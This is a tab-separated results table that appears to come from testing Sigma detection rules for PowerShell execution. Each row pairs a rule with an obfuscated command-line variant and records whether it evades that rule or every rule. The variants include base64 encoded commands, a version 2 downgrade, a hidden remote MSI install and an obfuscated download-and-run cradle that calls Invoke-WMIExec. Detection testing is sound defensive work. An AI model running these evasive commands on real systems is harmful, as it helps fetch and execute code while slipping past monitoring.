Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1059.001	proc_creation_win_powershell_base64_wmi_classes	PowerShell Base64 Encoded WMI Classes	1816994b-42e1-4fb1-afd2-134d88184f71		"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_base64_wmi_classes	PowerShell Base64 Encoded WMI Classes	1816994b-42e1-4fb1-afd2-134d88184f71		powershell.exe -enCODedCOMmand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA	TRUE	TRUE	FALSE	PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_base64_wmi_classes	PowerShell Base64 Encoded WMI Classes	1816994b-42e1-4fb1-afd2-134d88184f71		powershell.exe -enc SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA	TRUE	TRUE	FALSE	PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_base64_wmi_classes	PowerShell Base64 Encoded WMI Classes	1816994b-42e1-4fb1-afd2-134d88184f71		powershell.exe -eNcOdEdCOMMAnD SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA	TRUE	TRUE	FALSE	PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -Command ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -c ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -CommaNd ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -""Command"" ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe /""Command"" ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -coMMaNd ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_convertto_securestring	ConvertTo-SecureString Cmdlet Usage Via CommandLine	74403157-20f5-415d-89a7-c505779585cf		"powershell.exe -coMmanD ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -comMAnD ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe /""Command"" ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -""Command"" ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -c ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0	"C:\temp\custom_host.exe  -W Hidden -C \""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')\"""	"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -W Hidden -C ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	TRUE	FALSE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); PowerShell MSI Install via WindowsInstaller COM From Remote Location (222720a7-047f-4054-baa5-bab9be757db0); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -""W"" Hidden -""C"" ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -w Hidden /""C"" ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -W Hidden -""C"" ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe /""W"" Hidden /""C"" ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -""W"" Hidden -C ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\temp\custom_host.exe && C:\temp\custom_host.exe -W Hidden /""C"" ""$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe -W Hidden -C ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe -w Hidden -C ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe -W Hidden -c ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe /""W"" Hidden -""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe -w Hidden /""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_comobject_msi_remote	PowerShell MSI Install via WindowsInstaller COM From Remote Location	222720a7-047f-4054-baa5-bab9be757db0		"powershell.exe -W Hidden /""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\updater.exe && C:\Temp\updater.exe -version 2	TRUE	TRUE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\updater.exe && C:\Temp\updater.exe -vErSIoN 2	TRUE	TRUE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\updater.exe && C:\Temp\updater.exe -""version"" 2"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\updater.exe && C:\Temp\updater.exe -VeRsIOn 2	TRUE	TRUE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\updater.exe && C:\Temp\updater.exe -vErSioN 2	TRUE	TRUE	FALSE	Potential Defense Evasion Via Rename Of Highly Relevant Binaries (0ba1da6d-b6ce-4366-828c-18826c9de23e); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2-Command ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -Version 2-Command ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -V 2-Command ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -""v"" 2-Command ""Write-Host 'Bypass'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -Version 2.0 -Command ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -VerSIoN 2.0 -c ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2.0 -""Command"" ""Write-Host 'Bypass'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2.0 -cOmmAnd ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -VERsION 2.0 -c ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2.0 -c ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2.0 -ComMAnd ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -VErsION 2.0 -COmManD ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -VerSiOn 2.0 -coMmAND ""Write-Host 'Bypass'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_downgrade_attack	Potential PowerShell Downgrade Attack	b3512211-c67e-4707-bedc-66efc7848863		"powershell.exe -v 2.0 /""Command"" ""Write-Host 'Bypass'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -nop -noni -ep bypass -w h -c ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	TRUE	TRUE	FALSE	Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell /""nop"" -NOni -ExecutionPolicy bypass -w h -""c"" ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -NoProfile -noni -Ep bypass -w h -c ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	TRUE	TRUE	FALSE	Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -NoProfile -NoNi /""ep"" bypass /""w"" h -""c"" ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell /""nop"" -""noni"" -ExecutionPolicy bypass -w h -C ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -nOP -nONi -""ep"" bypass -""w"" h -C ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -nOp -noni -ExecutionPolicy bypass /""w"" h -Command ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -""nop"" -Noni -ExecutionPolicy bypass -""w"" h -C ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -NOp -noni -Ep bypass -""w"" h -c ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -NoProfile -noni -ExecutionPolicy bypass -w h -Command ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	TRUE	TRUE	FALSE	Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_download_cradle_obfuscated	Obfuscated PowerShell OneLiner Execution	44e24481-6202-4c62-9127-5a0ae8e3fe3d		"powershell -NoProfile -noNi -ExecutionPolicy bypass /""w"" h -C ""$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"""	FALSE	FALSE	FALSE	
